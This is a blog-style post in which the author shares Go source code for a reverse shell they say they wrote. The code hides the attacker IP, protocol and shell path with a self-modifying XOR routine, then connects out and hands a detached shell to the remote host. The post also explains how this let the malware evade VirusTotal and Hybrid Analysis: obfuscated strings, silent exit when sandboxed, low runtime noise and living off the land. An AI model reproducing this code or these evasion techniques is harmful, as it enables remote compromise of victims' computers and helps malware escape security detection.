# Evasion Tricks: How a basic reverse shell can't be flagged by Static analysis and sandboxes

Hi, i'm hoWo (lammer btw), today, we'll see how this basic malware, write in golang, havn't been flagged in Virus Total (sandbox + static) and Hybrid Analysis (sandbox + static too)

## Understanding the malware

In this section, we will try to understand the malware: What it do?

### What it do?

For convenience, i bring the source-code (i'm afraid of skids now) of the malware:

```go
package main

import (
	"net"
	"os/exec"
	"syscall"
)

/* DOCS
xe -> xor encoder
	p -> plain
	k & kk -> key
	x -> xor
	xs -> xor string

main
	kb -> key in bytes
	p -> protocol
	aip -> attacker IP
	s -> shell
	c -> connection
	e -> error
	cc -> command

*/

func xe(p, kk []byte) (x []byte) {
	xs := make([]byte, len(p))
	k := kk
	for i := range len(p) {
		xs[i] = p[i] ^ k[(i+1)%len(k)]
		k[(i+2)%len(k)] = k[i%len(k)]

	}

	return xs

}

func main() {
	kb := []byte{103, 111, 103, 111, [...], 103, 111}
	p := []byte{27, 4, 31}
	aip := []byte{93, 86, 92, 73, 94, 94, [...], 94, 86, 94}
	s := []byte{64, 5, 6, 9, 64, 20, 7}
	c, e := net.Dial(string(xe(p, kb)), string(xe(aip, kb)))
	if e != nil {
		return

	}

	defer c.Close()
	cc := exec.Command(string(xe(s, kb)))

	cc.Stdin = c
	cc.Stderr = c
	cc.Stdout = c

	cc.SysProcAttr = &syscall.SysProcAttr{
		Setsid: true,
	}

	_ = cc.Run()

}

```

As we can see, it's a really simple code for a really simple function: pwn your computer.
The first part of `main` func, define and initialize four slices of bytes: 

- `kb` (xor key in bytes)
- `p` (the protocol for `net.Dial`, basically "tcp")
- `aip` (attacker IP and port)
- `s` (shell, probally `"/bin/bash"` or `"/bin/sh"`)

After that, the program will try to create a TCP connection (`c, e := net.Dial`, `c` means connection and `e` means error).
If some error occurs, `return` finish the process.

The malware use `defer` to guarantee that conn'll be correctly stopped after main func finish.
Then, we create the exec.Command that will call the shell.
And the code block:

```go
cc.Stdin = c
cc.Stderr = c
cc.Stdout = c
```

redirect `Stdin`, `Stdout` and `Stderr` to our connection.

The last code block is very important:

```go
cc.SysProcAttr = &syscall.SysProcAttr{
	Setsid: true,
}

_ = cc.Run()
```

Here, the malware manually change the process (that will be created when we run the shell) attributes to guarantee that the new child process will be the parent of a new session (the PID will be equal to the SID of new session) and will disassociates itself from the controlling terminal of the parent process.
Basically, the child process (in our case, the shell), can't be stopped by SIGHUP of the controller terminal of the parent process (that means that a `^C`, or close the ssh conn, will not kill the shell)

Then, we will run the shell using `_ = cc.Run()`, the underline (`_`) means that we don't care 'bout the error that `cc.Run()` will return (if some).

### Understanding the XOR

This malware don't use a normal xor (`pseudo: plain[i] = plain[i] ^ key[i]`, this is a "normal" xor), the developer added a detail that changes everything:

```go
k[(i+2)%len(k)] = k[i%len(k)]
```

The key changes itself during the xor.
A good point to implement this is: if someone try to get the value of key and aip, for example, he can't just xor it again to get my IP, he will need to re-create my xor function.

## Understanding the Evasion

Now, we already understand the malware, so we can try to understand how it beat Virus Total and Hybrid Analysis.

### Obfuscated Strings

Critical strings like the shell bin path, ip, protocol, etc, aren't strings that can be triggered in static analysis.
Basic YARA Rules that try to get any string that is normal in malware, don't work and AVs just don't find "/bin/sh" (or any shell) out of runtime

### Minimal Conditional Execution

The malware try to connect to the attacker, if it don't works, the process exits normally without errors.
Sandboxes, like Falcon sandbox, just haven't access to external networks like the attacker's server, so the process just exit like nothing happened.
Basically, the malware in sandbox don't create traffic, don't create any sub-process, don't do nothing.

In sandbox view point, the program don't do nothing, and nothing isn't malicious.

### Low runtime "noise"

The malicious code, don't create nothing new (as it don't do nothing btw), so sandboxes mark it as clean, because it haven't any IOC

### LOLBINs

As a reverse shell, the code don't need to load a custom payload, it just spawn the shell.
It run as a _living off the land_: it uses binaries that already exists in system

## Conclusion

The malware isn't sofisticated, it's just simple.

---

> Refs:
<br>Malware was developed by me.
<br>All the text was wrote by me (but i used google translator to expand my limited vocabulary).

